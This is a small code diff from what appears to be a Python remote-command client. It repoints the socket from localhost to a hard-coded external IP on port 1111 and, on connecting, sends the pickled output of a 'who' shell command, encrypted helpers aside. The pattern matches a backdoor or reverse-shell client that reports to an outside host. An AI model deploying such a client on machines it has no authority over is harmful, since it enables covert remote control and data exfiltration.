@@ -11,9 +11,9 @@ from Crypto.Cipher import AES
 
 
 socket = socket.socket()
-HVA = '145.109.173.68'
+HVA = '145.109.151.121'
 l = 'localhost'
-serverAddress = l, 1111
+serverAddress = HVA, 1111
 
 
 def encryptAES(message, key):
@@ -53,7 +53,7 @@ def receive(socket):
         print(e)
 
 def main():
-    
+
     socket.connect(serverAddress)
     #Standard command to identify who this machine is
     socket.send(pickle.dumps(popenExecution("who").split()[0])) 
